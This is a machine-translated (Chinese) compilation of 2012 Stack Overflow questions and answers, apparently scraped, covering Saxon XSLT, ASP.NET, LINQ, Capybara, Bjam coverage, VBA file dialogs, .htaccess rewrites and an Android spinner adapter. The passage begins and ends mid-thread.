问题再次出现在 Java 端。我将在哪里/如何指定这个“-it：main”？这样做不会破坏其他不需要指定的 XSLT 吗？我是否必须将每个 XSLT 文件中的每个模板命名为“main”？鉴于 Transformer.transform() 的方法签名，我*必须*指定源文件，所以这不会破坏我在解决这个问题方面取得的所有进展吗？

**编辑：**如果有人在寻找它，我发现 s9api 隐藏在 saxon9he.jar 中。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-18T20:48:22.977

您正在使用为 XSLT 1.0 设计的 JAXP API。如果您想利用 XSLT 2.0 的特性，例如在命名模板上启动转换的能力，我建议您改用 s9api 接口，它为此目的设计得更好。

但是，如果您有很多现有的 JAXP 代码并且您不想重写它，您通常可以通过将 JAXP 对象向下转换为底层 Saxon 实现类来实现您想要的。例如，您可以将 JAXP 转换器转换为 net.sf.saxon.Controller，这样您就可以访问 controller.setInitialTemplate()；在调用 transform() 方法时，只需提供 null 作为 Source 参数。

顺便说一句，如果您正在编写需要 2.0 处理器的代码，那么我不会使用 TransformerFactory.newInstance()，它会为您提供它在类路径中找到的任何旧 XSLT 处理器。改用新的 net.sf.saxon.TransformerFactoryImpl()，(a) 更健壮，(b) 更快。

# c# - 一次回发后从列表中删除

> ID：10658684
> 
> 赞同：0
> 
> 时间：2012-05-18T19:31:35.647
> 
> 标签：c#, asp.net, button, dynamic, arraylist

我创建了一种`Listbox`食物（苹果、香蕉等），并`Javascript`在页面上运行，将列表中的选定项目添加到`ArrayList`一个按钮中。该按钮的功能是，当您单击它时，该项目将从中删除，`ArrayList`并且该按钮也将被删除（在回发之后）。

当我运行此代码时，它会将项目添加到列表中并按预期创建按钮。但是，当我单击该按钮时，它不会从列表中删除该项目，直到页面第二次重新加载。

`ArrayList`我怎样才能拥有它以便在单击和第一次回发之后而不是在两次回发之后删除该项目？

```
static private ArrayList myAL { set; get; }

protected void Page_Load(object sender, EventArgs e)
{
    if (!IsPostBack)
        myAL = new ArrayList();

    Report1();

    Label1.Text = myAL.Count.ToString();
}

private void Report1()
{
    String FullFilter = ""; int FilterCount = 0;

    if (Request.Params["ListBox1Hidden"] != null && (string)Request.Params["ListBox1Hidden"] == "doubleclicked")
        myAL.Add(lstBox.SelectedItem.Text);

    myAL.Remove(Session["RemoveButton"].ToString());
    foreach (Object obj in myAL)
    {
        FilterCount++;
        if (FilterCount > 1)
            FullFilter += ", ";

        FullFilter += String.Format("'{0}'", obj);

        Button button = new Button();
        button.Text = obj.ToString();
        button.ID = "Dist" + obj.ToString();
        button.Click += new EventHandler(ButtonClickOneEvent);
        PlaceHolder1.Controls.Add(button);
    }

    Label1.Text += FullFilter;
}

void ButtonClickOneEvent(object sender, EventArgs e)
{
    Button button = sender as Button;
    myAL.Remove(button.Text);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T19:48:47.883

您可以在视图状态中保存一个值，指示第一个回发已被处理。在这种情况下，这可能是最直接的方法，无需处理其他处理静态值的方法。

# linq - 获取太多字符文字时出错

> ID：10658688
> 
> 赞同：0
> 
> 时间：2012-05-18T19:31:59.570
> 
> 标签：linq, linq-to-sql

```
var query = from s in bv.baParticularHeaders
            from v in bv.baPlanColumnStructures
            where x.Contains(s.Particular_Num)
            select new LevelList
            {
                Value =  'Level ' + LTRIM(Rtrim(Convert(Char,P.Level_Num))) + ' - ',
                id = 'Column ' + LTRIM(Rtrim(Convert(Char,P.Column_Num))) + ' ',
                Text = v.Column_Description
            };

return query.Distinct().OrderBy(o => o.Value).AsQueryable<LevelList>(); 
```

获取这两行代码时出错。

```
Value =  'Level ' + LTRIM(Rtrim(Convert(Char,P.Level_Num))) + ' - ',
                    id = 'Column ' + LTRIM(Rtrim(Convert(Char,P.Column_Num))) + ' ', 
```

任何机构都可以帮助我如何在 LINQ 中转换它吗？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-18T19:35:25.967

您不能只是剪切和粘贴 SQL，重新排列它并希望获得有效的 LINQ 查询。目的是编写适当的 C# 代码，并将其*翻译*成 SQL。在这种情况下，我怀疑你想要：

```
var query = from s in bv.baParticularHeaders
            from v in bv.baPlanColumnStructures
            where x.Contains(s.Particular_Num)
            select new LevelList
            {
                Value =  "Level " + P.Level_Num + " - ";
                id = "Column " + p.Column_Num + " ",
                Text = v.Column_Description
            };

return query.Distinct().OrderBy(o => o.Value).AsQueryable(); 
```

注意字符串文字 -`"Level "`不是`'Level '`。代码首先必须是有效的 C#。

（假设`Level_Num`和`Column_Num`是数字，我不明白为什么修剪它们是有意义的。）

# java - 如何同时使用线程对不同的对象进行碰撞检测

> ID：10658696
> 
> 赞同：0
> 
> 时间：2012-05-18T19:32:18.140
> 
> 标签：java, applet

我发现了很多关于碰撞检测的问题，并且我创建了一个足够有效的方法来检测两个给定的对象对是否碰撞。问题是，当我将对象数量从 2 增加到 20 时，算法突然停止正常工作。例如，如果粒子 1 撞击粒子 10，那么粒子 10 会依次跳过其他对象并直接与墙壁碰撞。

其背后的原因是，当粒子 1 实际上与粒子 10 发生碰撞时，我的算法不是检查它们之间的碰撞，而是检查其他对。

根据我的解决方案，将同时为每一对运行碰撞检测方法。现在，我需要将粒子一和粒子二传递给每个线程，其中一和二是要检测碰撞的对象。

这是伪代码：

```
private double isColliding(Particle One, Particle Two) { 
     //Collision Detection Mechanism
     //Returns 0 if no collision
     //Otherwise returns a double between 0 and 1 
     //used to clip the velocity vector so that it stops right before collision
} 
```

所以，我想知道如何将上述方法转换为在不同的线程上运行不同的对象对......

另外，有没有其他方法可以做到这一点......

注意....上述方法不会改变粒子一或二的任何值，因此可以异步使用....

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T23:59:48.107

这里是轻量版的线程^^

```
 double result;
    Thread t = new Thread(){
      public void run(){
        result = isColliding(aParticle, aParticle);
      }
    };
    t.start();

    t.join(); 
```

连接让主线程等待线程 t 完成。把它放在一个 2-dim for 循环中，用一个结果数组和一个线程数组迭代每个粒子对，最后调用 join 。你得到了想要的东西。

但是尝试做某事是没有意义的。在多个线程中工作，如果它不是在一个线程中运行 ^^ 所以实际上我对你的回答是。你做了某事。错误的。您应该修复您的碰撞检测功能。如果您需要帮助，您应该向我们提供更多代码。

# ruby-on-rails-3 - Capybara 不会用重复的标签填写字段

> ID：10658697
> 
> 赞同：1
> 
> 时间：2012-05-18T19:32:18.443
> 
> 标签：ruby-on-rails-3, capybara, form-for

我有一个表单页面，其中包含电子邮件地址和密码的确认字段，两者都带有“确认”标签。正如预期的那样，使用 RSpec 运行时会失败。如果我使标签独一无二，例如将电子邮件标签更改为“电子邮件确认”，那么它将通过。我宁愿保持标签不变。如果我使用 form_for 生成的电子邮件 ID，Capybara 似乎很高兴，但测试失败。我也试过这个名字，结果相同。

RSpec/水豚提取物：

```
fill_in "company_contact_email_confirmation", with: "example@example.com" 
```

form_for 提取：

```
<div class="field">
  <%= f.label :contact_email_confirmation, "Confirmation" %><br />
  <%= f.email_field :contact_email_confirmation %>
</div> 
```

生成源：

```
<div class="field">
  <label for="company_contact_email_confirmation">Confirmation</label><br>
  <input id="company_contact_email_confirmation" name="company[contact_email_confirmation]" size="30" type="email">
</div> 
```

错误信息：

1) 使用有效信息注册的公司页面应创建公司

```
 Failure/Error: expect { click_button submit }.to change(Company, :count).by (1)
   count should have been changed by 1, but was changed by 0 
```

如果我使用 Capybara `within`，正如这里其他地方所建议的那样，它仍然不起作用：

RSpec/水豚提取物：

```
within ".email_stuff" do
  fill_in "Confirmation", with: "example@example.com"
end 
```

form_for 提取：

```
<div class="email_stuff">
  <div class="field">
    <%= f.label :contact_email_confirmation, "Confirmation" %><br />
    <%= f.email_field :contact_email_confirmation %>
  </div>
</div> 
```

生成源：

```
<div class="email_stuff">
  <div class="field">
    <label for="company_contact_email_confirmation">Confirmation</label><br />
    <input id="company_contact_email_confirmation" name="company[contact_email_confirmation]" size="30" type="email" />
  </div>
  </div> 
```

Capybara 似乎没有抱怨，但测试失败并出现同样的错误。如何让 Capybara 允许我在同一个表单上使用同一个标签两次？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-19T00:50:21.640

我在 ActiveRecord after_validation 回调中添加了一些调试语句，以查看虚拟确认字段的状态。如上面的代码所示，我通过名称或 ID 引用了电子邮件确认字段，但没有同时引用密码确认和带有 ID 的电子邮件确认字段。Capybara 将密码数据放在错误的确认字段中，因为电子邮件确认字段首先出现在表单上。如果我将 ID 放在密码字段上，它就会起作用。两者上的 ID 都是最安全的。

# c++ - Bjam 用于 gcov 覆盖率分析？

> ID：10658701
> 
> 赞同：6
> 
> 时间：2012-05-18T19:32:49.673
> 
> 标签：c++, boost, code-coverage, gcov, bjam

我希望为主要用 C++ 编写的项目集成一个重要的跨平台构建系统。到目前为止，我已经评估了 Cmake 和 Scons，虽然它们都代表了对 (GNU) make 的改进，但在我尝试使用这些工具的上下文中，这两种方法似乎既不优雅也不透明。这让我想到了 Boost Build (Bjam)，我很受鼓舞的是，鉴于我的项目依赖于 Boost，bjam 应该已经可用于任何可行的目标平台。

我在尝试为库的单元测试巧妙地集成代码覆盖率时遇到了困难......以最终集成到构建服务器（如 Jenkins）中。虽然我愿意以 Bjam 最佳/标准实践为指导，但我认为我需要三个不同的“变体”：

*   release - 仅构建优化的静态库
*   debug - 构建非优化的静态库和单元测试
*   覆盖 - 构建支持覆盖的库并与未启用覆盖的单元测试链接。

本质上，除了标准的调试和发布版本之外，我还想要一个专用的调试版本，它还可以收集覆盖率数据。

我需要使用（至少）g++ 和 msvc 构建......并且仅使用 g++ 使用 gcov 开关。这意味着我的库目标需要与单元测试可执行目标不同的“编译器标志”......并且仅适用于我的一个编译器套件......并且仅适用于一个变体。

我不清楚如何最好地使用 Bjam 来实现这一点——不过，我怀疑它应该是一个相当常见的用例。Bjam 是否明确支持 gcov 覆盖分析（可能使用 lcov 呈现结果）？如果没有，任何人都可以推荐一种支持上述（简化）方案的策略吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-01-06T15:12:45.297

我有同样的需求，我基本上添加了以下几行来在我的 Jamroot 文件中定义我自己的覆盖变体。

```
variant coverage : debug : <cxxflags>--profile-arcs <cxxflags>--test-coverage <cxxflags>--coverage <link>shared ;
lib gcov : : <name>gcov : ;

unit-test mytest : tests/mytest.cpp libboost_unit_test : <variant>coverage:<library>gcov ; 
```

覆盖数据是在测试运行时创建的，然后我使用 gcov 在 bjam 之外利用它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T00:59:22.547

我非常有信心，您的第一个问题（bjam 是否明确支持 gcov）的答案是肯定的**，**因为就像调试和发布构建配置一样，bjam 会认为这是用户定义的[功能变体](http://www.boost.org/boost-build2/doc/html/bbv2/overview/builtins/features.html).

对于 bjam，看起来有几种方法可以做你想做的事：

1.  [定义您自己的功能变体](http://article.gmane.org/gmane.comp.lib.boost.build/20174/match=purecov)，然后为任何自定义标志更新 CONFIG_COMMAND。

2.  [定义/重新定义工具集](http://article.gmane.org/gmane.comp.lib.boost.build/20172/match=purecov)。

对于 CMake，请考虑遵循 ITK 所做的模式：

[http://cmake.org/Wiki/ITK/Policy_and_Procedure_for_Adding_Dashboards#Configuring_GCOV_Coverage](http://cmake.org/Wiki/ITK/Policy_and_Procedure_for_Adding_Dashboards#Configuring_GCOV_Coverage)

# c# - Linq OrderBy(Byte[]) 值

> ID：10658709
> 
> 赞同：4
> 
> 时间：2012-05-18T19:33:41.807
> 
> 标签：c#, linq

```
public class foo {
  int ID { get; set; }
  byte[] sort { get; set; }
}

public class barMaster {
    public void FooSource() {
        return List<foo> FromDataSource;
    }
    public void display() {
        List<foo> sortedFoo = FooSource().OrderBy(f => f.sort);
        UIElement = sortedFoo;
    } 
```

我有一组包含我想要 OrderBy 的 byte[] 属性的对象，但是 OrderBy(byte[]) 会引发错误：

```
System.ArgumentException: At least one object must implement IComparable. 
```

我可以对 OrderBy byte[] 值做些什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-18T19:36:15.517

您不能`byte[]`直接订购，因为数组不实现`IComparable`. 您需要按第一个字节排序（即：`OrderBy(f => f.sort[0])`或其他适当的），或者编写自己的并在[OrderBy](http://msdn.microsoft.com/en-us/library/bb549422.aspx)`IComparer<byte[]>`的适当重载中使用它。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-18T19:56:40.627

正如[您已经指出数组的长度可变](https://stackoverflow.com/questions/10658709/linq-orderbybyte-values/10658931#comment13933458_10658931)（因为它是 SQL Server 层次结构 ID），您绝对需要创建自定义[`IComparer<byte[]>`](http://msdn.microsoft.com/en-us/library/8ehhxeaf.aspx)实现。

逻辑很简单：

*   逐字节比较每个数组的第一个`n`字节，其中`n`是两个数组中较小的一个的字节数。当检测到任何字节之间存在差异时，返回不同字节的比较结果。
*   如果第一个`n`字节相等，则返回两个数组长度的比较。

这样，给定一组数据，如下所示：

```
00 01 02
00 01
01 
```

排序后，您将获得的结果是：

```
00 01
00 01 02
01 
```

也就是说，这就是您的`IComparer<byte[]>`实现的样子：

```
// I could be wrong in that this is called natural order.
class NaturalOrderByteArrayComparer : IComparer<byte[]>
{
    public int Compare(byte[] x, byte[] y)
    {
        // Shortcuts: If both are null, they are the same.
        if (x == null && y == null) return 0;

        // If one is null and the other isn't, then the
        // one that is null is "lesser".
        if (x == null && y != null) return -1;
        if (x != null && y == null) return 1;

        // Both arrays are non-null.  Find the shorter
        // of the two lengths.
        int bytesToCompare = Math.Min(x.Length, y.Length);

        // Compare the bytes.
        for (int index = 0; index < bytesToCompare; ++index)
        {
            // The x and y bytes.
            byte xByte = x[index];
            byte yByte = y[index];

            // Compare result.
            int compareResult = Comparer<byte>.Default.Compare(xByte, yByte);

            // If not the same, then return the result of the
            // comparison of the bytes, as they were the same
            // up until now.
            if (compareResult != 0) return compareResult;

            // They are the same, continue.
        }

        // The first n bytes are the same.  Compare lengths.
        // If the lengths are the same, the arrays
        // are the same.
        if (x.Length == y.Length) return 0;

        // Compare lengths.
        return x.Length < y.Length ? -1 : 1;
    }
} 
```

顺便说一句，如果您的字节数组保证具有相同的长度，作为替代方案，您可以动态创建 order by 子句，按第一个元素排序，然后是第二个元素，等等，如下所示：

```
static IEnumerable<foo> OrderBySortField(this IEnumerable<foo> items, 
    int sortLength)
{
    // Validate parameters.
    if (items == null) throw new ArgumentNullException("items");
    if (sortLength < 0) throw 
        new ArgumentOutOfRangeException("sortLength", sortLength,
            "The sortLength parameter must be a non-negative value.");

    // Shortcut, if sortLength is zero, return the sequence, as-is.
    if (sortLength == 0) return items;

    // The ordered enumerable.
    IOrderedEnumerable<foo> ordered = items.OrderBy(i => i.sort[0]);

    // Cycle from the second index on.
    for (int index = 1; index < sortLength; index++)
    {
        // Copy the index.
        int indexCopy = index;

        // Sort by the next item in the array.
        ordered = ordered.ThenBy(i => i.sort[indexCopy]);
    }

    // Return the ordered enumerable.
    return ordered;
} 
```

然后你可以简单地这样称呼它：

```
// You have to supply the length of the array you're sorting on.
List<foo> sortedFoo = FooSource().
    OrderBySortField(sortLength).ToList(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-18T19:49:44.780

不幸的是，据我所知，您不能按字节数组排序。

你可以做的是让你的 foo 类实现 IComparable。然后在覆盖的 compareTo 方法中，在调用中根据需要编写字节数组的比较。然后，您可以使用简单的排序来替换 Order By：

```
FooSource().Sort(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-09-28T15:16:45.450

我知道，这是一个老问题，但在特定情况下，当字节数组包含一个数字（例如 IP 地址）时，BitConverter 类可用：

```
OrderBy(d => BitConverter.ToInt32(d.bytearray,0)) 
```

来源：[https ://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/types/how-to-convert-a-byte-array-to-an-int](https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/types/how-to-convert-a-byte-array-to-an-int)

# visual-studio-2010 - 我想重定向我们在 VS2010 中运行的代码审查工具的输出，以便我们可以单击输出转到文件、行、列

> ID：10658710
> 
> 赞同：1
> 
> 时间：2012-05-18T19:33:45.200
> 
> 标签：visual-studio-2010, visual-studio-addins

我想重定向我们在 VS2010 中编写的代码审查工具的输出，以便它的消息由 Vs2010 解析，我们可以单击它们转到文件、行、列。

我依稀记得在vs2005中学习过这个，你将文本输出到某种窗口，格式如下，然后vs会解析消息，你可以点击它转到特定位置...

D:\Project Files\CIS3G\Webapp_Test_BLL\Evaluation\Reports\TestEvaluationHistoryBLL.cs(27,44)：警告 CS0649：错误文本

它是这样建造的：

完整文件路径：[错误或警告类型]：错误信息

然后它只是“神奇地”工作..

但这就是我从大约 10 年前关于如何做到这一点的一次谈话中所记得的全部内容。有谁记得我在说什么，并且可以指导我了解有关如何使用我们编写的用于 Visual Studio 2010 中的工具的输出来完成这项工作的信息？

也许是教程？

这篇文章： [格式化自定义工具的输出，以便我可以双击 Visual Studio 中的错误并打开文件](https://stackoverflow.com/questions/6419415/formatting-the-output-of-a-custom-tool-so-i-can-double-click-an-error-in-visual)

谈论在构建中这样做，但我希望能够独立运行代码审查工具并让它也能工作......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T20:30:40.507

你的问题几乎是正确的。

例如，在您的临时目录中创建一个文件（在命令提示符`echo %temp%`下找到它），名为`test.bat`

将以下内容添加到`test.bat`：

```
@echo D:\Project Files\CIS3G\Webapp_Test_BLL\Evaluation\Reports\TestEvaluationHistoryBLL.cs(27,44): warning CS0649: Error text 
```

现在在 VS10 中，选择`Tools`-> `External Tools...`。在新窗口中，选择`Add`。

在该`Command:`字段中，输入`%temp%\test.bat`

选择`Use Output window`并单击`OK`。

您的新工具现在应该出现在 VS10 的`Tools`菜单中。如果你点击它，你的输出窗口应该会显示一条可点击的消息，如果它存在，它将打开“D:\Project Files\CIS3G\Webapp_Test_BLL\Evaluation\Reports\TestEvaluationHistoryBLL.cs”，如果存在的话，会将光标放在第 27 行如果存在（如果不存在，则第 1 列），它存在于第 44 列（如果不存在，则第 1 行）。

您可以更进一步，为您的自定义工具添加快捷键。

选择`Tools`-> `Options...`-> `Environment`-> `Keyboard`。在命令列表中找到您的工具。它将显示它在外部工具列表`Tools.ExternalCommand[x]`中`[x]`的位置。在框中输入您选择的快捷键`Press shortcut keys:`，然后单击`OK`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T21:04:46.163

这是 2004 年写的一篇关于这样做的文章，今天仍然适用：

[http://www.codeproject.com/Articles/6176/Using-the-Output-Window-in-DevStudio](http://www.codeproject.com/Articles/6176/Using-the-Output-Window-in-DevStudio)

是的，我写了它，但正如前面所指出的，这并没有什么特别神奇的地方。文章中提到了 VC6 和 VC7，但我在 VS2005、VS2008 和 VS2010 中仍然使用这种技术来输出 PC-Lint。

# php - 尝试在 .htaccess 中重写 URL 时出现 500 内部服务器错误

> ID：10658711
> 
> 赞同：1
> 
> 时间：2012-05-18T19:33:49.107
> 
> 标签：php, .htaccess, mod-rewrite, url-rewriting

我需要您的帮助来创建动态 URL 以获得 SEO 收益。我尝试在我当前的 URL 上实现以下 .htaccess。但我收到**500 内部服务器错误**

请问问题出在哪里？谢谢

**关联**

```
http://127.0.0.1/index.php?id=1 
```

**.htaccess**

```
RewriteEngine on
RewriteRule ^index/([a-zA-Z0-9]+)/$ index.php?id=$1 
```

**Apache 错误日志**

> 无效的命令“RewriteEngine”，可能拼写错误或由未包含在服务器配置中的模块定义

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T19:38:37.897

将您的规则替换为

```
RewriteRule ^index/([a-zA-Z0-9]+)/$ index.php?id=$1 [L] 
```

`a-Z`不像人们想象的那样工作，而且`A-z`很奇怪。这就是引发错误的原因。

此外，添加`[L]`标志可防止进一步重写。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T19:39:12.987

您需要安装[mod rewrite 模块](http://httpd.apache.org/docs/2.0/mod/mod_rewrite.html)。

# vba - VBA 对话文件过滤器部分文件名

> ID：10658715
> 
> 赞同：4
> 
> 时间：2012-05-18T19:34:19.333
> 
> 标签：vba, filesystems

我有一个包含几个 .txt 文件的目录。比方说

```
hi.txt
hello.txt
hello_test.txt
test.txt 
```

在 VBA 中使用文件对话框，如何过滤以在下拉列表中仅显示“*test.txt”匹配文件（即最后两个）？或者我只能使用 *. 过滤器？

以下似乎它应该工作，但没有：

```
Sub TestIt()
   Dim test As Variant 'silly vba for not having a return type..
   test = Application.GetOpenFilename(FileFilter:="test (*test.txt), *test.txt")
End Sub 
```

编辑：澄清以防这不清楚：我想过滤“ *test.txt”而不是“* .txt”文件，所以我只能从选择器中的 hello_test.txt 和 test.txt 中进行选择。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-30T17:47:45.200

我看到您担心将文本放入文件名框中，但这正是您需要做的，并且似乎是您的情况的常态。我挂断了完全相同的问题。

这是我使用的：

```
Public Sub Browse_Click()

Dim fileName As String
Dim result As Integer
Dim fs

With Application.FileDialog(msoFileDialogFilePicker)
    .Title = "Select Test File"
    .Filters.Add "Text File", "*.txt"
    .FilterIndex = 1
    .AllowMultiSelect = False
    .InitialFileName = "*test*.*"

    result = .Show

    If (result <> 0) Then
        fileName = Trim(.SelectedItems.Item(1))

        Me!txtFileLocation = fileName

    End If
End With 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-18T19:51:33.593

文件对话框怎么样？

```
Dim dlgOpen As FileDialog
Set dlgOpen = Application.FileDialog(msoFileDialogOpen)
With dlgOpen
    .AllowMultiSelect = True
    .InitialFileName = "Z:\docs\*t*.*x*"
    .Show
End With 
```

[http://msdn.microsoft.com/en-us/library/aa213120(v=office.11​​).aspx](http://msdn.microsoft.com/en-us/library/aa213120(v=office.11).aspx)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-18T21:34:14.057

这是你正在尝试的吗？将此粘贴到模块中并运行子`OpenMyFile`

```
Private Declare Function GetOpenFileName Lib "comdlg32.dll" Alias _
"GetOpenFileNameA" (pOpenfilename As OPENFILENAME) As Long

Private Type OPENFILENAME
    lStructSize       As Long
    hwndOwner         As Long
    hInstance         As Long
    lpstrFilter       As String
    lpstrCustomFilter As String
    nMaxCustFilter    As Long
    nFilterIndex      As Long
    lpstrFile         As String
    nMaxFile          As Long
    lpstrFileTitle    As String
    nMaxFileTitle     As Long
    lpstrInitialDir   As String
    lpstrTitle        As String
    flags             As Long
    nFileOffset       As Integer
    nFileExtension    As Integer
    lpstrDefExt       As String
    lCustData         As Long
    lpfnHook          As Long
    lpTemplateName    As String
End Type

Sub OpenMyFile()
    Dim OpenFile As OPENFILENAME
    Dim lReturn As Long
    Dim strFilter As String

    OpenFile.lStructSize = Len(OpenFile)

    '~~> Define your filter here
    strFilter = "Text File (*test.txt)" & Chr(0) & "*test.txt" & Chr(0)

    With OpenFile
        .lpstrFilter = strFilter
        .nFilterIndex = 1
        .lpstrFile = String(257, 0)
        .nMaxFile = Len(.lpstrFile) - 1
        .lpstrFileTitle = .lpstrFile
        .nMaxFileTitle = .nMaxFile
        .lpstrInitialDir = "C:\Users\Siddharth Rout\Desktop\"
        .lpstrTitle = "My FileFilter Open"
        .flags = 0
    End With

    lReturn = GetOpenFileName(OpenFile)

    If lReturn = 0 Then
        '~~> User cancelled
        MsgBox "User cancelled"
    Else
        MsgBox "User selected" & ":=" & OpenFile.lpstrFile
        '
        '~~> Rest of your code
        '
    End If
End Sub 
```

# actionscript-3 - 找不到基类 Sprite 的 Flash 11.2 sdk 定义

> ID：10658717
> 
> 赞同：1
> 
> 时间：2012-05-18T19:34:27.553
> 
> 标签：actionscript-3, flash, flashdevelop, starling-framework

我正在尝试使用 Flash 11.2 使用 FlashDevelop 构建一个简单的示例项目。出于某种原因，它不会让我扩展 Sprite。当我尝试编译时，它只是说：

col: 31 错误：未找到基类 Sprite 的定义。

我的代码中只有：

```
public class Game extends Sprite
{
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-24T12:18:33.170

确保您在 Flex SDK 安装中正确进行了以下设置：

\frameworks\libs\player\11.2\playerglobal.swc

并且您在 FD 中设置了一个名为“swf-version=15”的编译器常量。

如果那不能解决它，那么您的库的路径不明确。可能他们有空格或特殊字符。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T19:36:28.540

您是否导入了正确的包？flash.display.Sprite

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-05-02T15:37:22.297

你把 starling-framework 作为一个标签，所以如果你使用 Starling，它应该是：

```
import starling.display.Sprite; 
```

# android - 微调器看起来不合适

> ID：10658726
> 
> 赞同：4
> 
> 时间：2012-05-18T19:35:09.950
> 
> 标签：android, spinner

我的活动中有一个微调器。我使用 ArrayList 和自定义 SpinnerAdapter 来填充按下 Spinner 时弹出的列表。

我的问题是 Spinner 在未按下时在 Activity 上的外观。都是灰色的。没有文字可见。即使在我按下微调器然后从结果列表中选择一个项目后，微调器也不会填充文本。

此外，当我从 Spinner 中选择一个项目，然后打印所选项目的位置时，它会打印 -1。许多人评论说我的微调器没有附加数据列表，但显然有。我还能如何按下 Spinner 然后从结果列表中进行选择？

```
 // This sets up the adapter and the arraylist that contains the data
            private void setUpAdapter() {
                mData = new ArrayList<MyData>();
                mAdapter = new MyAdapter(mData);
                mSpinner.setAdapter(mAdapter);

                mSpinner.setOnItemSelectedListener(new Spinner.OnItemSelectedListener() {
                    public void onItemSelected(AdapterView<?> parent,
                            View view, int pos, long id) {
                            MyData g = (MyData) parent.getItemAtPosition(pos);
                            // TODO
                        }

                        public void onNothingSelected(AdapterView parent) {
                          // Do nothing.
                        }
                });
            }

    // this populates the arraylist that is attached to the spinner's adapter
// it is called once an AsyncTask finishes pulling data from a local database
            private void populateSpinner(ArrayList<MyData> result) {
                if (result != null) {
                    if (mData == null) {
                        mData = new ArrayList<MyData>();
                    }
                    else {
                        mData.clear();
                    }

                    for (int index = 0; index < result.size(); index++) {
                        mData.add(result.get(index));
                    }

                    mSpinner.setSelected(0);
                }
            }

    // this is the adapter for the spinner
            private class MyAdapter implements SpinnerAdapter {

                ArrayList<MyData> data;

                public MyAdapter(ArrayList<MyData> data){
                    this.data = data;
                }

                @Override
                public int getCount() {
                    return data.size();
                }

                @Override
                public Object getItem(int position) {
                    return data.get(position);
                }

                @Override
                public long getItemId(int position) {
                    return position;
                }

                @Override
                public int getItemViewType(int position) {
                    return android.R.layout.simple_spinner_dropdown_item;
                }

                @Override
                public View getView(int position, View convertView, ViewGroup parent) {
                    TextView v = new TextView(getApplicationContext());
                    v.setTextColor(Color.BLACK);
                    v.setText(data.get(position).getName());
                    v.setPadding(0, 20, 0, 20);
                    return v;
                }

                @Override
                public int getViewTypeCount() {
                    return 1;
                }

                @Override
                public boolean hasStableIds() {
                    return false;
                }

                @Override
                public boolean isEmpty() {
                    return false;
                }

                @Override
                public void registerDataSetObserver(DataSetObserver observer) {
                    // TODO Auto-generated method stub
                }

                @Override
                public void unregisterDataSetObserver(DataSetObserver observer) {
                    // TODO Auto-generated method stub
                }

                @Override
                public View getDropDownView(int position, View convertView, ViewGroup parent) {
                    return this.getView(position, convertView, parent);
                }
            }

<Spinner
    android:id="@+id/my_spinner"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content" /> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-23T18:47:59.293

为您的微调器使用 Activity 上下文而不是 Application 上下文。请参阅 api 文档[`getApplicationContext()`](http://developer.android.com/reference/android/content/ContextWrapper.html#getApplicationContext%28%29)以了解其正确用法。

将活动上下文传递给`MyAdapter`并在创建回调`TextView`中使用它。`getView`

```
mAdapter = new MyAdapter(mData, this); // this is activity context. 
```

在 MyAdapter 中：

```
public MyAdapter(ArrayList<MyData> data, Context context){
     this.data = data;
     mContext = context;
}

@Override
public View getView(int position, View convertView, ViewGroup parent) {
     TextView v = new TextView(mContext);
     v.setTextColor(Color.BLACK);
     v.setBackgroundColor(Color.WHITE);
     v.setText(data.get(position).getName());
     v.setPadding(0, 20, 0, 20);
     return v;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-22T05:17:28.697

```
When I select an item from the Spinner and then print the selected item position, it prints -1 
```

这是因为您引用的是*空白*列表

```
mData = new ArrayList<MyData>();
mAdapter = new MyAdapter(mData);
mSpinner.setAdapter(mAdapter); 
```

`onPostExecute()`在AsynTask中设置微调器适配器。

```
@Override
protected void onPreExecute() {
        mData = new ArrayList<MyData>();
        super.onPreExecute();
}

@Override
protected Void doInBackground(String... params) {
        //gets "result" to fill mData
        return null;
}

@Override
protected void onPostExecute(Void result) {
    setUpAdapter();
}

private void setUpAdapter() {
    if (result != null) {
          if (mData == null) {
                 mData = new ArrayList<MyData>();
           }
           else {
                 mData.clear();
           }

           for (int index = 0; index < result.size(); index++) {
                 mData.add(result.get(index));
           }

            mAdapter = new MyAdapter(mData);
            mSpinner.setAdapter(mAdapter);
            mSpinner.setSelected(0);

            mSpinner.setOnItemSelectedListener(new Spinner.OnItemSelectedListener() {
                public void onItemSelected(AdapterView<?> parent,
                        View view, int pos, long id) {
                        MyData g = (MyData) parent.getItemAtPosition(pos);
                        // TODO
                    }

                    public void onNothingSelected(AdapterView parent) {
                      // Do nothing.
                    }
            });
        } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-27T18:08:14.983

此代码有效，微调器正确显示该字段，但我必须说它可能不是 100% 完美，由于某种原因我无法将字段的初始值留空，默认情况下它具有项目 0 的值。包 com.cccheck；

```
public class OneCheckActivity extends Activity {

LayoutInflater factory;

/** Called when the activity is first created. */
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.spinner_view);
